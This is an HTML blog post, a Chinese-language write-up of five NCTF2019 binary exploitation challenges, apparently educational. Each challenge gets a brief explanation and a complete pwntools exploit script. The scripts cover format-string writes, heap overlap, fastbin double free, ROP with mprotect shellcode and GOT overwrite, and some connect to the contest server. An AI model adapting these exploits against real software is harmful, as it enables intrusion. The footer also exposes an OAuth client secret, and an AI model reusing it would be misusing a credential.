@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>NCTF2019-pwn-writeup - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="NCTF2019pwn题的wp">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2019-pwn-writeup">
+<meta property="og:url" content="http://shiroinu.top/2019/12/05/NCTF2019-pwn-writeup/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="NCTF2019pwn题的wp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-05T13:58:02.998Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NCTF2019-pwn-writeup">
+<meta name="twitter:description" content="NCTF2019pwn题的wp">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1575554516916">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head_2.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head_2.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>13</div>
+        <div><span>标签</span>2</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>NCTF2019-pwn-writeup</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年12月05日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.5k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 8 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>NCTF2019pwn题的wp</p>
+<a id="more"></a>
+<h1 id="pwn-me-100-years-Ⅱ"><a href="#pwn-me-100-years-Ⅱ" class="headerlink" title="pwn me 100 years! (Ⅱ)"></a>pwn me 100 years! (Ⅱ)</h1><p>64位格式化字符串题,修改<code>base + 0x2020e0</code>地址处的值为0x66666666获取shell</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+#sh = process(&#39;./pwn_me_2&#39;)
+sh = remote(&#39;139.129.76.65&#39; ,50005)
+#context.log_level = &#39;DEBUG&#39;
+target_num = 0x6666 # 26214 len = 5
+#gdb.attach(sh)
+sh.recvuntil(&#39;but your name:&#39;)
+payload = &#39;a&#39; * 0x10 + &#39;%p,&#39;
+sh.sendline(payload)
+sh.recvuntil(&#39;preparing......&#39;)
+base_addr = int(sh.recvuntil(&#39;,&#39;)[:-1],16) - 0x202080
+log.info(&#39;base_addr = &#39; + hex(base_addr))
+target_addr = base_addr + 0x2020e0
+log.success(&#39;target_addr = &#39;+ hex(target_addr))
+sh.recvuntil(&#39;what do you want?&#39;)
+payload = &#39;%&#39; + str(target_num) + &#39;c&#39; + &#39;%10$hn&#39;  + &#39;%&#39; + str(0x16666 - target_num) + &#39;c&#39; + &#39;%11$hn&#39; + &#39;A&#39; * 6 + p64(target_addr) + p64(target_addr + 0x2)
+#payload = &#39;A&#39;*7 + &#39;%9$p,%10$p,%11$p,&#39; + &#39;A&#39;*8 +  p64(target_addr) + p64(target_addr + 0x4)
+sh.sendline(payload)
+sh.interactive()</code></pre>
+<h1 id="pwn-me-100-years-Ⅲ"><a href="#pwn-me-100-years-Ⅲ" class="headerlink" title="pwn me 100 years! (Ⅲ)"></a>pwn me 100 years! (Ⅲ)</h1><p>堆题,漏洞点在于<code>off_by_one</code>修改chunk_size使得堆重叠来获得<code>libc_base</code>,之后的流程就很固定了,直接<code>malloc</code>size = 0x70的fake_chunk即可</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+#sh = process(&#39;./pwn_me_3&#39;)
+sh = remote(&#39;139.129.76.65&#39; ,50006)
+main_arena_88_offset = 0x3C4B78
+main_arena_offset = main_arena_88_offset - 88
+find_fake_fast = 0x3C4AED
+one_gadget = 0xf1147
+malloc_hook = 0x3c4b10
+context.log_level = &#39;DEBUG&#39;
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;size:&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;content:&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;5,exit&#39;)
+def delete(index):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;idx:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;5,exit&#39;)
+def show(index):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;idx&#39;)
+    sh.sendline(str(index))
+    content = sh.recvuntil(&#39;1&#39;)[1:-2]
+#    log.info(content)
+    sh.recvuntil(&#39;5,exit&#39;)
+    return content
+def edit(index,content):
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&#39;idx:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;content:&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;5,exit&#39;)
+#gdb.attach(sh)
+sh.recvuntil(&#39;5,exit&#39;)
+add(8,&#39;aaaa&#39;) #0
+add(0x20,&#39;bbbb&#39;) #1
+add(0x40,&#39;c&#39;) #2
+add(0x60,&#39;d&#39;) #3 
+add(0x60,&#39;ee&#39;) #4
+add(0x60,&#39;ff&#39;) #5 
+edit(0,&#39;a&#39; * 16 + &#39;\x00&#39; * 8 + &#39;\xf1&#39;) #size 0xf1 = [1] + [2] + [3]
+delete(1)
+add(0x20,&#39;\n&#39;) #1 
+#show(2)
+libc_base = u64(show(2).ljust(8,&#39;\x00&#39;)) - main_arena_88_offset
+log.info(&#39;libc_base = &#39; +hex(libc_base))
+add(0x40,&#39;\n&#39;) #6
+add(0x60,&#39;\n&#39;) #7 堆重叠
+delete(2)
+delete(3)
+add(0x40,&#39;b&#39;)
+edit(7, p64(libc_base + find_fake_fast))
+add(0x60,&#39;a&#39;)
+add(0x60,&#39;a&#39;*0x13 + p64(libc_base + one_gadget))
+sh.sendline(&#39;1&#39;)
+sh.sendline(str(8))
+sh.interactive()</code></pre>
+<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>看似简单的ROP题,但是<code>seccomp()</code>函数禁用了绝大部分的系统调用,所以不能使用<code>system(&#39;/bin/sh&#39;)</code>,看了别人的wp才知道是使用<code>mprotect()</code>来修改bss段权限,然后用<code>shellcraft</code>直接读flag</p>
+<pre><code class="python">from pwn import *
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+rdi_ret = 0x400bc3
+rsi_r15_ret = 0x400bc1
+rbp_ret = 0x400970
+puts_got = 0x601028
+puts_plt = 0x400870
+start_addr = 0x400910
+context.log_level = &#39;DEBUG&#39;
+sh = process(&#39;./warm_up&#39;)
+gdb.attach(sh)
+sh.recvuntil(&#39;!!!&#39;)
+payload = &#39;a&#39;* 0x18
+sh.sendline(payload)
+content = sh.recvuntil(&#39;?&#39;)
+canary = u64(&#39;\x00&#39; + content[26:33])
+log.info(&#39;canary = &#39;+hex(canary))
+payload = &#39;a&#39; * 0x18 + p64(canary) + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
+sh.sendline(payload)
+content = sh.recvuntil(&#39;\n&#39;)
+#log.info(content)
+libc_base = u64(content[:-1].ljust(8,&#39;\x00&#39;)) - 0x6f690
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+sh.recvuntil(&#39;!!!&#39;)
+sh.sendline(&#39;aaa&#39;)
+sh.recvuntil(&#39;?&#39;)
+rdx_ret = libc_base + 0x1b92
+mprotect_addr = libc_base + 0x101770
+read_addr = libc_base + 0xf7250
+bss = 0x601000
+payload = &#39;a&#39; *0x18 + p64(canary) + p64(0)
+payload += p64(rdi_ret) + p64(bss)
+payload += p64(rsi_r15_ret) + p64(0x2000) + p64(0) 
+payload += p64(rdx_ret) + p64(7)
+payload += p64(mprotect_addr) 
+payload += p64(rdi_ret) + p64(0)
+payload += p64(rsi_r15_ret) + p64(bss) + p64(0)
+payload += p64(rdx_ret) + p64(0x100) 
+payload += p64(read_addr)
+payload += p64(bss)
+sh.sendline(payload)
+shellcode = shellcraft.amd64.open(&#39;./flag&#39;)
+shellcode += shellcraft.amd64.read(3,bss + 0x200,0x30)
+shellcode += shellcraft.amd64.write(1,bss + 0x200 ,0x30)
+sleep(0.5)
+sh.send(asm(shellcode))
+sh.interactive()</code></pre>
+<h1 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy_rop"></a>easy_rop</h1><p>ROP题,有意思的一点是在输入时<code>&#39;a&#39;</code>会导致直接跳过整个循环,而<code>&#39;+&#39;</code>则不会,并且视作不进行输入,知道了这一点后就很简单了,那个循环里可泄露，也可覆写,ROP即可。因为没开RELRO保护所以可以直接GOT覆写。</p>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+sh = process(&#39;./easy_rop&#39;)
+context.log_level = &#39;DEBUG&#39;
+#gdb.attach(sh)
+def set(addr):
+    sh.recvuntil(&#39;:&#39;)
+    sh.sendline(str(addr % 0x100000000))
+    sh.recvuntil(&#39;:&#39;)
+    sh.sendline(str(addr / 0x100000000))
+read_plt = 0x850
+write_plt = 0x820
+puts_got = 0x201238
+puts_plt = 0x810
+rsp_rrr_ret = 0xb9d
+rdi_ret = 0xba3
+rsi_r15_ret = 0xba1
+one_gadget = 0x4526a
+sh.recvuntil(&#39;Please input some number&#39;)
+for i in range(28):
+    sh.recvuntil(&#39;:&#39;)
+    sh.sendline(&#39;+&#39;)
+    sh.recvline()
+sh.recvuntil(&#39;:&#39;)
+sh.sendline(&quot;+&quot;)
+sh.recvuntil(&#39;= &#39;)
+leak1 = int(sh.recvuntil(&#39;\n&#39;)[:-1])
+
+if(leak1 &lt; 0):
+    leak1 += 0x100000000
+sh.recvuntil(&#39;:&#39;)
+sh.sendline(&#39;+&#39;)
+sh.recvuntil(&#39;= &#39;)
+leak2 = int(sh.recvuntil(&#39;\n&#39;)[:-1])
+if(leak2 &lt; 0):
+    leak2 += 0x100000000
+pie = (leak2 * 0x100000000 + leak1) - 0xb40
+log.success(&#39;base = &#39; + hex(pie))
+
+set(pie + rsp_rrr_ret)
+set(pie + 0x201408)
+sh.recvuntil(&#39;What\&#39;s your name?\n&#39;)
+payload = p64(pie + rdi_ret) + p64(1) + p64(pie + rsi_r15_ret) + p64(pie + puts_got) + p64(0) + p64(pie + write_plt)
+payload += p64(pie + rdi_ret) + p64(0) + p64(pie + rsi_r15_ret) + p64(pie + puts_got) + p64(0) + p64(pie + read_plt) 
+payload +=p64(pie + puts_plt)
+sh.sendline(payload)
+content = sh.recv()
+log.info(content)
+libc_base = u64(content[:8]) - 0x6f690
+log.info(&#39;libc_base = &#39; + hex(libc_base))
+sh.sendline(p64(libc_base + one_gadget))
+sh.interactive()</code></pre>
+<h1 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h1><p>堆题,关键点在于一开始往bss段读了个name,可以置入<code>fake_size</code>,漏洞点就是<code>double_free</code></p>
+<pre><code class="python">from pwn import *
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;What\&#39;s your heap_size?&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;What\&#39;s your heap_content?&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;4. exit&#39;)
+def show(index):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;What\&#39;s your heap_index?&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;:&#39;)
+    content = sh.recvuntil(&#39;W&#39;)[1:-2]
+#    log.info(content)
+    sh.recvuntil(&#39;4. exit&#39;)
+    return content
+def delete(index):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;What\&#39;s your heap_index?&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;4. exit&#39;)
+name_addr = 0x602060
+one_gadget = 0xf1147
+sh = remote(&#39;139.129.76.65&#39; ,50001)
+#sh = process(&#39;./easy_heap&#39;)
+#gdb.attach(sh)
+elf = ELF(&#39;./easy_heap&#39;)
+puts_got = elf.got[&#39;puts&#39;]
+context.log_level = &#39;DEBUG&#39;
+sh.recvuntil(&#39;What\&#39;s your name?&#39;)
+name = p64(0) + p64(0x41) # fake_size
+sh.send(name)
+sh.recvuntil(&#39;4. exit&#39;)
+add(0x30,&#39;aaa&#39;) #0
+add(0x30,&#39;bbb&#39;) #1
+add(0x40,&#39;ccc&#39;) #2
+delete(0)
+delete(1)
+delete(0) #double_free
+add(0x30,p64(name_addr)) #3
+add(0x30,&#39;ddd&#39;) #4
+add(0x30,&#39;eee&#39;) #5
+add(0x30,p64(0) + p64(0xff) + p64(puts_got)) #6 修改ptr(0)为puts_got,直接show()
+libc_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x6f690 #puts_offset
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+find_fake_fast_offset = 0x23
+malloc_hook_addr = libc_base + 0x3c4b10
+add(0x60,&#39;aaa&#39;) # 7
+add(0x60,&#39;bbb&#39;) #8
+add(0x50,&#39;ccc&#39;) #9
+delete(7)
+delete(8)
+delete(7)
+add(0x60,p64(malloc_hook_addr - find_fake_fast_offset)) #10
+add(0x60,&#39;d&#39;) #11
+add(0x60,&#39;e&#39;) #12
+add(0x60, &#39;a&#39; *0x13 + p64(libc_base + one_gadget))
+sh.sendline(&#39;1&#39;)
+sh.sendline(&#39;32&#39;)
+sh.interactive()</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1575554516919"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
